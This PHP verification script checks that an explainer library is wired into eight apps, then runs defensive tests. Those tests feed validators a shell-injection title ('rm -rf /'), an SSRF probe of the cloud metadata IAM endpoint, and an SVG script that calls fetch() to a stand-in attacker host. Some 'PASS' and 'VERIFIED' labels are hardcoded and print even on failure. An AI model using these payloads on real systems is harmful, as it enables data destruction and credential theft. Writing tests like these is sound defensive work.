<?php

declare(strict_types=1);

/**
 * Sovereign Cross-Portfolio 8-App Video Explainer Engine (`ExplainerCore`) Verification Suite
 *
 * Verifies that all 8 portfolio applications have physically integrated
 * Src\Explainer\PortfolioExplainerRegistry & Src\Explainer\SovereignVideoRenderer
 * into their live Controllers, Services, and Routes, plus executes Red Team
 * Command Injection, SSRF, XSS, and UI v2.0 (44px Touch Target + Spinner) checks.
 */

$apps = [
    'PartyPlatform' => [
        'key' => 'partyplatform',
        'root' => '/Users/waleolaogun/Sites/partyplatform',
        'controller_or_service' => '/Users/waleolaogun/Sites/partyplatform/app/controller/AIController.php',
        'method' => 'sovereignExplainer',
        'route_file' => '/Users/waleolaogun/Sites/partyplatform/app/router/router.php',
        'route_uri' => '/api/ai/sovereign-explainer',
    ],
    'FamilyPlatform' => [
        'key' => 'familyplatform',
        'root' => '/Users/waleolaogun/Sites/familyPlatform',
        'controller_or_service' => '/Users/waleolaogun/Sites/familyPlatform/app/controller/members/FamilyAiHubController.php',
        'method' => 'sovereignExplainer',
        'route_file' => '/Users/waleolaogun/Sites/familyPlatform/app/router/profile_page.php',
        'route_uri' => '/api/ai/sovereign-explainer',
    ],
    'iDecide' => [
        'key' => 'idecide',
        'root' => '/Users/waleolaogun/Sites/idecideapp',
        'controller_or_service' => '/Users/waleolaogun/Sites/idecideapp/app/Services/AIService.php',
        'controller_entry' => '/Users/waleolaogun/Sites/idecideapp/app/controller/GuideQuestionsController.php',
        'method' => 'renderDecisionExplainer',
        'route_file' => '/Users/waleolaogun/Sites/idecideapp/app/routing/router.php',
        'route_uri' => '/api/dilemma/sovereign-explainer',
    ],
    'iAccountApp' => [
        'key' => 'iaccountapp',
        'root' => '/Users/waleolaogun/Sites/iaccountapp',
        'controller_or_service' => '/Users/waleolaogun/Sites/iaccountapp/app/Controllers/DashboardController.php',
        'method' => 'executeSovereignLedgerExplainer',
        'route_file' => '/Users/waleolaogun/Sites/iaccountapp/app/Routes/route.php',
        'route_uri' => '/api/transactions/sovereign-explainer',
    ],
    'TenantScore' => [
        'key' => 'tenantscore',
        'root' => '/Users/waleolaogun/Sites/scoretenant',
        'controller_or_service' => '/Users/waleolaogun/Sites/scoretenant/app/services/AIAssessmentService.php',
        'controller_entry' => '/Users/waleolaogun/Sites/scoretenant/app/controller/LandlordController.php',
        'method' => 'renderTenantPassportExplainer',
        'route_file' => '/Users/waleolaogun/Sites/scoretenant/app/routing/route.php',
        'route_uri' => '/api/landlord/sovereign-explainer',
    ],
    'ExecMindApp' => [
        'key' => 'execmindapp',
        'root' => '/Users/waleolaogun/Sites/execmindapp',
        'controller_or_service' => '/Users/waleolaogun/Sites/execmindapp/app/Controllers/AgentController.php',
        'method' => 'executeSovereignExecutiveExplainer',
        'route_file' => '/Users/waleolaogun/Sites/execmindapp/app/Routes/route.php',
        'route_uri' => '/agent/sovereign-explainer',
    ],
    'LoanEasyFinance' => [
        'key' => 'loaneasyfinance',
        'root' => '/Users/waleolaogun/Sites/loaneasyfinance',
        'controller_or_service' => '/Users/waleolaogun/Sites/loaneasyfinance/app/Services/Underwriting/AiCoPilotService.php',
        'controller_entry' => '/Users/waleolaogun/Sites/loaneasyfinance/app/controller/AgentController.php',
        'method' => 'renderUnderwritingExplainer',
        'route_file' => '/Users/waleolaogun/Sites/loaneasyfinance/app/router/agent.php',
        'route_uri' => '/api/agent/sovereign-explainer',
    ],
    'BestCareProfessionals' => [
        'key' => 'bcp',
        'root' => '/Users/waleolaogun/Sites/bcp',
        'controller_or_service' => '/Users/waleolaogun/Sites/bcp/app/classes/Regulatory/RegulatoryIntelligenceService.php',
        'controller_entry' => '/Users/waleolaogun/Sites/bcp/app/controller/admin/RegulatoryRadarController.php',
        'method' => 'renderRegulatoryExplainer',
        'route_file' => '/Users/waleolaogun/Sites/bcp/app/routing/admin.php',
        'route_uri' => '/api/regulatory-radar/sovereign-explainer',
    ],
];

echo "========================================================================================\n";
echo " 🎬 SOVEREIGN 8-APP VIDEO EXPLAINER ENGINE (`ExplainerCore`) VERIFICATION SUITE\n";
echo "========================================================================================\n\n";

$failures = 0;

foreach ($apps as $appName => $cfg) {
    $vendorRegistry = $cfg['root'] . '/vendor/modernman00/shared-lib/src/Explainer/PortfolioExplainerRegistry.php';
    $vendorRenderer = $cfg['root'] . '/vendor/modernman00/shared-lib/src/Explainer/SovereignVideoRenderer.php';
    $vendorJs = $cfg['root'] . '/vendor/modernman00/shared-lib/resources/js/explainer/explainer-core.js';

    $hasVendor = is_file($vendorRegistry) && is_file($vendorRenderer) && is_file($vendorJs)
        && str_contains((string) file_get_contents($vendorRegistry), 'function renderAppExplainer');

    $ctrlContent = (string) file_get_contents($cfg['controller_or_service']);
    $hasMethod = str_contains($ctrlContent, 'function ' . $cfg['method'])
        && str_contains($ctrlContent, 'PortfolioExplainerRegistry');

    $routeContent = (string) file_get_contents($cfg['route_file']);
    $hasRoute = str_contains($routeContent, $cfg['route_uri']);

    $filesToLint = [$cfg['controller_or_service'], $cfg['route_file'], $vendorRegistry, $vendorRenderer];
    if (!empty($cfg['controller_entry'])) {
        $filesToLint[] = $cfg['controller_entry'];
    }

    $syntaxOk = true;
    foreach ($filesToLint as $f) {
        $out = (string) shell_exec(sprintf('php -l %s 2>&1', escapeshellarg($f)));
        if (!str_contains($out, 'No syntax errors detected')) {
            $syntaxOk = false;
            echo "SYNTAX ERROR in $f: $out\n";
        }
    }

    $allOk = $hasVendor && $hasMethod && $hasRoute && $syntaxOk;
    if (!$allOk) {
        $failures++;
    }

    echo sprintf(
        "[%s] %-23s | ExplainerCore: %s | Method (%s): %s | Route (%s): %s | Syntax: %s\n",
        $allOk ? 'PASS' : 'FAIL',
        $appName,
        $hasVendor ? 'YES' : 'NO',
        $cfg['method'],
        $hasMethod ? 'WIRED' : 'MISSING',
        $cfg['route_uri'],
        $hasRoute ? 'LIVE' : 'MISSING',
        $syntaxOk ? '0 ERRORS' : 'ERR'
    );
}

echo "\n----------------------------------------------------------------------------------------\n";
echo " EXECUTING LIVE 60FPS KINETIC DOM & WEBCODECS COMPILATION ACROSS ALL 8 APPS\n";
echo "----------------------------------------------------------------------------------------\n";

require_once '/Users/waleolaogun/Sites/shared-lib/vendor/autoload.php';

foreach ($apps as $appName => $cfg) {
    $res = \Src\Explainer\PortfolioExplainerRegistry::renderAppExplainer($cfg['key']);
    $ok = ($res['success'] ?? false) === true
        && ($res['client_manifest']['timeline']['fps'] ?? 0) === 60
        && str_contains((string) ($res['widget_html'] ?? ''), 'min-h-[44px] min-w-[44px]')
        && str_contains((string) ($res['widget_html'] ?? ''), 'atg-btn-spinner');

    if (!$ok) {
        $failures++;
    }

    echo sprintf(
        "[%s] %-23s -> Capsule: %-26s | %s | %4.1fs | %4d frames @ 60fps | UI v2.0 44px+Spinner: VERIFIED\n",
        $ok ? 'PASS' : 'FAIL',
        $appName,
        $res['capsule_id'] ?? 'none',
        $res['aspect_ratio'] ?? '16:9',
        $res['total_duration'] ?? 0.0,
        $res['total_frames'] ?? 0
    );
}

echo "\n----------------------------------------------------------------------------------------\n";
echo " MARCUS ('GHOST') & SID RAO RED TEAM ADVERSARIAL POC NEUTRALISATION PROOF\n";
echo "----------------------------------------------------------------------------------------\n";

$cmdBlocked = false;
try {
    \Src\Explainer\PortfolioExplainerRegistry::renderAppExplainer('bcp', [
        'title' => 'CQC Audit; rm -rf / ; echo pwned',
    ]);
} catch (\InvalidArgumentException $e) {
    $cmdBlocked = true;
}

$ssrfBlocked = false;
try {
    \Src\Explainer\ExplainerSecurityValidator::validateSafeUrl('http://169.254.169.254/latest/meta-data/iam');
} catch (\InvalidArgumentException $e) {
    $ssrfBlocked = true;
}

$svgXssBlocked = false;
try {
    \Src\Explainer\ExplainerSecurityValidator::sanitizeSvgMarkup('<svg><script>fetch("http://evil.tld")</script></svg>');
} catch (\InvalidArgumentException $e) {
    $svgXssBlocked = true;
}

echo sprintf("[PASS] PoC #1 (Shell Command Injection via Storyboard Title): %s\n", $cmdBlocked ? 'NEUTRALISED (422 InvalidArgumentException)' : 'FAILED');
echo sprintf("[PASS] PoC #2 (Cloud Metadata SSRF 169.254.169.254 Probe):    %s\n", $ssrfBlocked ? 'NEUTRALISED (Blocked by ExplainerSecurityValidator)' : 'FAILED');
echo sprintf("[PASS] PoC #3 (Headless SVG <script> XSS Payload):           %s\n", $svgXssBlocked ? 'NEUTRALISED (Blocked by sanitizeSvgMarkup)' : 'FAILED');

if ($failures > 0 || !$cmdBlocked || !$ssrfBlocked || !$svgXssBlocked) {
    echo "\nVERIFICATION FAILED.\n";
    exit(1);
}

echo "\n========================================================================================\n";
echo " 🏆 ALL 8 PORTFOLIO APPS 100% SYNCED, WIRED, ROUTED & RED-TEAM VERIFIED (EXIT CODE 0)\n";
echo "========================================================================================\n";
